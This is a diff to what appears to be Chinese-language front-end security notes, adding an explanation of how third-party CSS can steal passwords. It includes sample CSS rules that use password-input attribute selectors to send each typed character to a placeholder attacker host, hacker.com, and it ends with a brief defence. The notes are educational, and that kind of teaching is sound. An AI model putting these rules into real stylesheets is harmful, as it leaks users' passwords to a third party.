@@ -154,9 +154,40 @@
     - 2.不要通过cdn的方式挂在第三方资源，建议保存在本地项目中在进行挂载
     - 3.对于需要npm install 安装的第三方库，应该明确指定版本或者通过`package-lock.json`锁定一个具体的版本
 
+###### 第三方css偷取密码问题
+
+> [这篇文章](http://blog.minfive.com/2018/02/23/2018-02-23-css-hacker/)讲的相当详细了
+
+- 前提知识：
+    - css选择器中存在这一种选择器：`input[type="password"][value$="1"]`,表示会选中 密码输入框中 属性value的值以1结尾的input框
+    - 默认情况下，在input中输入什么值，是不会直接反馈到input元素上的，比如input中输入123，html中，input的结构还是`<input type="" />`,不会增加一个value="123" 的属性，要通过document.querySelector('input').value的方式才能获取到值。
+    - 有些前端框架，比如react，则会将input的value值，直接写到input的dom结构上，比如input中输入123，html中，input的结构还是`<input type="" value="123" />`，查看<https://www.runoob.com/try/try.php?filename=try_react_form>，打开控制台就能验证。
+    - 结合前面的，`input[type="password"][value$="1"] { background-image: url("http://www.hacker.com/1"); }`这段代码的含义就是，给value值以1结尾的input，加上一个背景图。隐含的操作是：当输入框中输入1时，会向http://www.hacker.com/1发送一个请求，告诉该站点，用户输入了一个1。
+
+- 工作流程：
+    - 假设页面上加载了一段第三方的css文件:ui.css,css的内容如下，页面的框架是react。
+    - 以用户将在input框中输入值为 123456的密码为例.
+    - 当用户输入1时，input的结构为`<input type="" value="1" />`,value属性以1结尾,此时背景css生效，将加载http://www.hacker.com/1 这个图片，即发送出去了`http://www.hacker.com/1`的get请求。
+    - 用户紧接着输入2，input的结构为`<input type="" value="12" />`,value属性以2结尾,此时背景css生效，将加载http://www.hacker.com/2 这个图片，即发送出去了`http://www.hacker.com/2`的get请求。
+    - 以此类推，www.hacker.com站点上将收到 `http://www.hacker.com/1-6`的请求，通过分析access log日志，可以简单的知道用户输入的值为123456。
+    - 当然这个过程，本身会复杂的多，比如：如何保证请求有序发送出去，如何处理缓存。但是的确提供了一种窃取思路。
+
+- 防御：
+    - 谨慎加载第三方css
+
+```css
+input[type="password"][value$="1"] { background-image: url("http://www.hacker.com/1");
+input[type="password"][value$="2"] { background-image: url("http://www.hacker.com/2");
+input[type="password"][value$="3"] { background-image: url("http://www.hacker.com/3");
+input[type="password"][value$="4"] { background-image: url("http://www.hacker.com/4");
+input[type="password"][value$="5"] { background-image: url("http://www.hacker.com/5");
+input[type="password"][value$="6"] { background-image: url("http://www.hacker.com/6");
+
+```
+
 - 302跳转劫持问题
 - cdn劫持
-- 第三方css偷取密码问题
+
 - 可执行文件上传漏洞
 - http明文传输本身存在问题
 
